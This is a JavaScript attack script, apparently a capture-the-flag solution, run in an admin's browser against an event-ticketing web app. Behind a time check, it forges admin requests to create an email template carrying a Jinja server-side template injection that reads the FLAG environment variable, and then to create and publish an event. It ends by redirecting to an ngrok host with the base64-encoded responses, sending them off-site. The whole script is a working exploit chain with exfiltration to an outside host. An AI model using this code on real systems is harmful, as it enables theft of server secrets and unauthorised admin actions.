const N = "51";
if (Date.now() < new Date("2026-04-23T08:05:00Z").getTime())
  fetch("/admin/templates/create", {
    method: "POST",
    body:
      `name=test${N}&is_default=on&html_content=` +
      encodeURIComponent(
        `testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagr${N}</p>`,
      ),
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
  }).then(async (resp) => {
    const status = resp.status;
    const text = await resp.text();
    const headers = [...resp.headers];
    const url = resp.url;

    const r2 = await fetch("/admin/events/create", {
      headers: {
        "Content-Type":
          "multipart/form-data; boundary=----geckoformboundary723e28d6349b775d94a262bf290008d0",
      },
      body: '------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="name"\r\n\r\nsaaa\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="date"\r\n\r\n2026-10-10\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="time"\r\n\r\n10:10\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="description"\r\n\r\naaaa\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="location"\r\n\r\naaaa\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="ticket_price"\r\n\r\n1\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="total_tickets"\r\n\r\n1000\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="template_id"\r\n\r\n\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0\r\nContent-Disposition: form-data; name="is_published"\r\n\r\non\r\n------geckoformboundary723e28d6349b775d94a262bf290008d0--\r\n',
      method: "POST",
    });

    const status2 = r2.status;
    const text2 = await r2.text();
    document.location =
      "https://eaf3-195-113-197-234.ngrok-free.app/" +
      new TextEncoder()
        .encode(JSON.stringify({ text2, text, headers, url, status, status2 }))
        .toBase64();
  });
